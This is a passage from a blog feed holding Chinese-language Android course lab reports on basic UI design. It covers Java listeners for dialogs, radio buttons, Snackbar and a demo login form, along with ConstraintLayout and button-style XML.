class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(getApplication(),<span class="string">"您选择了["</span>+items[which]+<span class="string">"]"</span>, Toast.LENGTH_SHORT).show();&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .setNegativeButton(<span class="string">"取消"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(getApplication(),<span class="string">"您选择了[取消]"</span>,Toast.LENGTH_SHORT).show();&#125;</span><br><span class="line">        &#125;).create();</span><br><span class="line"><span class="comment">// 监听图片控件</span></span><br><span class="line">ImageView img=(ImageView)findViewById(R.id.imageView);</span><br><span class="line">img.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        alertdialog.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>4）单选按钮</p><p>单选选项都是放在一个RadioGroup中，创建一个RadioGroup对象，设置监听器<code>setOnCheckedChangeListener</code>，监听选项的变化。</p><p>用Snackbar代替Toast，获得更好的体验。</p><blockquote><p>make：创建，必须。三个参数（根布局、显示的消息、时长）</p><p>setAction：监听右侧按钮，进行事件处理，两个参数（按钮显示的文本、处理点击事件的逻辑）</p><p>setActionTextColor：设置按钮文本颜色</p><p>setDuration：定义 Snackbar 弹 出时间长度，单位为 ms，当右侧按钮被点击之后， Snackbar 会立刻消失</p><p>show：显示Snackbar</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> RadioGroup RGroup = (RadioGroup)findViewById(R.id.RadioGroup);</span><br><span class="line">RGroup.setOnCheckedChangeListener(<span class="keyword">new</span> RadioGroup.OnCheckedChangeListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheckedChanged</span><span class="params">(RadioGroup group, @IdRes <span class="keyword">int</span> checkedId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(checkedId == R.id.RB1) &#123;</span><br><span class="line">            Snackbar.make(group,<span class="string">"您选择了[学生]"</span>,Snackbar.LENGTH_SHORT)</span><br><span class="line">                .setAction(<span class="string">"确定"</span>, <span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                        Toast.makeText(getApplication(),<span class="string">"Snackerbar的确定按钮被点击了"</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setActionTextColor(getResources().getColor(R.color.colorPrimary))</span><br><span class="line">                .setDuration(<span class="number">5000</span>)</span><br><span class="line">                .show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Snackbar.make(group,<span class="string">"您选择了[教职工]"</span>,Snackbar.LENGTH_SHORT)</span><br><span class="line">                .setAction(<span class="string">"确定"</span>, <span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                        Toast.makeText(getApplication(),<span class="string">"Snackerbar的确定按钮被点击了"</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setActionTextColor(getResources().getColor(R.color.colorPrimary))</span><br><span class="line">                .setDuration(<span class="number">5000</span>)</span><br><span class="line">                .show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>5）登陆/注册</p><blockquote><p>getEditText()：获取TextInputLayout中的输入控件EditText</p><p>getEditText().getText().toString()：读取输入控件EditText中文本并转为字符串</p><p>setErrorEnabled：true，开启错误通知模式</p><p>setError：设置错误提示文本</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关联布局控件</span></span><br><span class="line"><span class="keyword">final</span> TextInputLayout NumText = (TextInputLayout)findViewById(R.id.editNum);</span><br><span class="line"><span class="keyword">final</span> TextInputLayout PWText = (TextInputLayout)findViewById(R.id.editPW);</span><br><span class="line"><span class="comment">// 获取TextInputLayout中的输入控件</span></span><br><span class="line">EditText NumEdit = NumText.getEditText();</span><br><span class="line">EditText PWEdit = PWText.getEditText();</span><br><span class="line"><span class="comment">// 监听按钮控件</span></span><br><span class="line">Button btn1 = (Button)findViewById(R.id.btn1);</span><br><span class="line">btn1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        String msg1 = <span class="string">""</span>;</span><br><span class="line">        String getNum = NumText.getEditText().getText().toString();</span><br><span class="line">        String getPW = PWText.getEditText().getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (getNum.equals(<span class="string">"123456"</span>) &amp;&amp; getPW.equals(<span class="string">"6666"</span>)) &#123;</span><br><span class="line">            msg1 = <span class="string">"登录成功"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg1 = <span class="string">"学号或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Snackbar.make(view,msg1,Snackbar.LENGTH_SHORT)</span><br><span class="line">                .setAction(<span class="string">"确定"</span>, <span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                        Toast.makeText(getApplication(),<span class="string">"Snackerbar的确定按钮被点击了"</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setActionTextColor(getResources().getColor(R.color.colorPrimary))</span><br><span class="line">                .setDuration(<span class="number">5000</span>)</span><br><span class="line">                .show();</span><br><span class="line">        <span class="keyword">if</span>(getNum.length()==<span class="number">0</span>) &#123;</span><br><span class="line">            NumText.setErrorEnabled(<span class="keyword">true</span>);</span><br><span class="line">            NumText.setError(<span class="string">"学号不能为空"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(getPW.length()==<span class="number">0</span>) &#123;</span><br><span class="line">            PWText.setErrorEnabled(<span class="keyword">true</span>);</span><br><span class="line">            PWText.setError(<span class="string">"密码不能为空"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">Button btn2 = (Button)findViewById(R.id.btn2);</span><br><span class="line">btn2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        String msg2 = <span class="string">""</span>;</span><br><span class="line">        choice = RGroup.getCheckedRadioButtonId();</span><br><span class="line">        <span class="keyword">if</span> (choice==R.id.RB1) &#123;</span><br><span class="line">            msg2 = <span class="string">"学生注册尚未开启"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            msg2 = <span class="string">"教职工注册尚未开启"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Snackbar.make(view,msg2,Snackbar.LENGTH_SHORT)</span><br><span class="line">                .setAction(<span class="string">"确定"</span>, <span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">                        Toast.makeText(getApplication(),<span class="string">"Snackerbar的确定按钮被点击了"</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .setActionTextColor(getResources().getColor(R.color.colorPrimary))</span><br><span class="line">                .setDuration(<span class="number">5000</span>)</span><br><span class="line">                .show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3、实验遇到困难以及解决思路</p><p>1） 根据实验文档，修改build.graple文件，点击sync now显示错误，发现是版本号原因，由26/25联想到安装版本不同的api数，还要修改成与上文出现的版本号一致就解决了。</p><p>2）在最后仿真的时候，手机上打不开应用，preview上提示<code>Cannot resolve symbol id/vision</code>，最后是在<code>strings.xml</code>或是<code>colors.xml</code>中添加相应的item。</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/75733026.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-14/75733026.jpg"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"visible"</span> <span class="attr">type</span>=<span class="string">"id"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"masked"</span> <span class="attr">type</span>=<span class="string">"id"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong><a href="https://github.com/YH-Chen/Android_lab" target="_blank" rel="noopener">Github</a></strong></p><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/32091554/44004940-ca3e00c6-9e9d-11e8-84d4-ffeb47c183a3.jpg&quot; alt=&quot;sysu&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="http://www.danboard.me/categories/Android/"/>
    
    
      <category term="android" scheme="http://www.danboard.me/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>【Android】Lab1_基本UI界面设计</title>
    <link href="http://www.danboard.me/%E3%80%90Android%E3%80%91Lab1-%E5%9F%BA%E6%9C%ACUI%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1/"/>
    <id>http://www.danboard.me/【Android】Lab1-基本UI界面设计/</id>
    <published>2018-05-12T14:28:57.000Z</published>
    <updated>2018-10-14T14:48:05.295Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://user-images.githubusercontent.com/32091554/44004940-ca3e00c6-9e9d-11e8-84d4-ffeb47c183a3.jpg" alt="sysu"></p><a id="more"></a><h2 id="一 实验题目"><a class="header-anchor" href="#一 实验题目" aria-hidden="true">¶</a> 一 实验题目</h2><ol><li>熟悉 Android Studio 开发工具操作</li><li>熟悉 Android 基本 UI 开发，并进行 UI 基本设计</li></ol><h2 id="二 实现内容"><a class="header-anchor" href="#二 实现内容" aria-hidden="true">¶</a> 二 实现内容</h2><p>实现一个 Android 应用，界面呈现如下效果：</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/57263485.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/57263485.jpg"></p><p>要求：</p><p>1、该界面为应用启动后看到的第一个界面</p><p>2、各控件的要求如下：</p><p>要求只用一个 ConstraintLayout 实现整个布局；</p><p>标题字体大小 20sp，与顶部距离 20dp，居中；图片与标题的间距为 20dp，居中；</p><p>输入框整体距屏幕右边间距 20dp，上下两栏间距 20dp，内容（包括提示内容）如图所示，内容字体大小 18sp；</p><p>学号对应的 EditText 只能输入数字，密码对应的 EditText 输入方式为密码；</p><p>两个单选按钮整体居中，字体大小 18sp，间距 10dp，默认选中的按钮为第一个；</p><p>两个按钮整体居中，与上方控件间距 20dp，按钮间的间距 10dp，文字大小 18sp。按钮背景框左 右边框与文字间距 10dp，上下边框与文字间距 5dp，圆角半径 10dp，背景色为#3F51B5</p><p>3、使用的布局和控件：ConstraintLayout、TextView、EditText、Button、ImageView、RadioGroup、 RadioButton</p><h2 id="三 课堂实验结果"><a class="header-anchor" href="#三 课堂实验结果" aria-hidden="true">¶</a> 三 课堂实验结果</h2><ol><li><p>实验截图</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/38141086.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/38141086.jpg"></p></li><li><p>实验步骤以及关键代码</p><p>1）文字信息，TextView模块。创建项目时，默认一个Activity以及一个activity_main.xml。xml文件中默认是一个TextView模块，文本text为hello world，只需将文本替换为“中山大学学生信息系统，再根据要求调整距离。</p><blockquote><p>id：模块标识</p><p>layout_width：布局宽度，必须。wrap_content | match_parent</p><p>layout_height：布局高度，必须。wrap_content | match_parent</p><p>text：文本信息</p><p>textSize：文字大小</p><p>textColor：文字颜色</p><p>layout_constraintXX_toXXOf：约束</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/textView"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:text</span>=<span class="string">"中山大学学生信息系统"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:textSize</span>=<span class="string">"20sp"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:textColor</span>=<span class="string">"@color/colorBlack"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag"><span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag"><span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>2）添加图片，ImageView模块。</p><p>图片位置，将图片复制粘贴到<code>res/drawable</code>，最后通过<code>@drawable/xxx</code>来调用；</p><p>图片大小，可以利用约束布局设置宽高的纵横比，把宽(layout_width)或者高(layout_height)设置为0dp，再根据另一个属性值和比例，计算当前属性值。</p><blockquote><p>layout_constraintDimensionRatio：设置图片比例</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/imageView"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:src</span>=<span class="string">"@drawable/sysu"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"150dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"0dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/textView"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintDimensionRatio</span>=<span class="string">"1:1"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>3）下面信息，每一行都有两个元素，可以使用线性布局LinearLayout。</p><p>输入模块，EditText，学号输入类型为<code>number</code>，密码输入类型为<code>textPasssword</code></p><blockquote><p>hint：输入框提示</p><p>inputType：输入类型</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Button"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/RadioGroup"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"登录"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/colorWhite"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/btn_selector"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"注册"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/colorWhite"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/btn_selector"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"10dp"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4）单选按钮，RadioGroup模块。<code>checked=&quot;true&quot;</code>默认选择。</p><blockquote><p>orientation：定位。horizontal 水平 | vertical 垂直</p><p>checked：默认选择。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RadioGroup</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/RadioGroup"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintLeft_toLeftOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintRight_toRightOf</span>=<span class="string">"parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@+id/password"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RadioButton</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/RB1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"学生"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"18sp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"10dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:checked</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RadioButton</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/RB2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"教职工"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textSize</span>=<span class="string">"18sp"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RadioGroup</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5）按钮模块Button。通过background设置按钮样式。</p><blockquote><p>background：背景颜色。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Button"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">app:layout_constraintTop_toBottomOf</span>=<span class="string">"@id/RadioGroup"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"登录"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/colorWhite"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/btn_selector"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/button2"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"注册"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/colorWhite"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"@drawable/btn_selector"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"10dp"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>res/drawable</code> 文件夹下新建一个 Drawable resource file，再设定背景颜色（<code>&lt;solid&gt;</code>标签），弧形按钮（<code>&lt;corners&gt;</code>标签），文字与按钮框边界距离（<code>&lt;padding&gt;</code>标签）。文字颜色设为白色，颜色添加在<code>res/values/colors.xml</code>中添加。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">shape</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:shape</span>=<span class="string">"rectangle"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--背景颜色--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">solid</span> <span class="attr">android:color</span>=<span class="string">"#003399 "</span> 